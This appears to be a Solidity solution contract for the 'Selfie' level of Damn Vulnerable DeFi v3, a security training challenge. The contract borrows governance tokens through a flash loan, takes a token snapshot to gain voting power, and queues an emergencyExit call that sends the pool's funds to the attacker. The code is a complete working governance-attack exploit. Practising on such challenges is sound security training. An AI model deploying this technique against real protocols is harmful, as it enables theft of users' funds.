// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "dvd-v3/selfie/SelfiePool.sol";
import "forge-std/console2.sol";

import {SelfiePool} from "dvd-v3/selfie/SelfiePool.sol";
import {SimpleGovernance} from "dvd-v3/selfie/SimpleGovernance.sol";
import {ISimpleGovernance} from "dvd-v3/selfie/ISimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "dvd-v3/DamnValuableTokenSnapshot.sol";


contract SelfieReceiver is IERC3156FlashBorrower {
    address private pool_addr;
    address private dvts_addr;
    address private attacker;

    SelfiePool private sp;
    SimpleGovernance private sg;
    DamnValuableTokenSnapshot private dvts;

    error UnsupportedCurrency();

    constructor(SelfiePool _sp, 
        DamnValuableTokenSnapshot _dvts, 
        SimpleGovernance _sg,
        address _attacker) {
        sp = _sp;
        dvts = _dvts;
        sg = _sg;
        attacker = _attacker;

        pool_addr = address(sp);
        dvts_addr = address(dvts);
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        assembly { // gas savings
            if iszero(eq(sload(pool_addr.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }
        
        if (token != dvts_addr)
            revert UnsupportedCurrency();
        
        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        dvts.approve(pool_addr, amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Internal function where the funds received would be used
    function _executeActionDuringFlashLoan() internal {
        // call token snapshot - makes _hasEnoughVotes => true
        // queue sp.emergencyExit(address(attacker))
        dvts.snapshot();
        sg.queueAction(pool_addr, 0, abi.encodeWithSignature("emergencyExit(address)", attacker));
    }

    // Allow deposits of ETH
    receive() external payable {}
}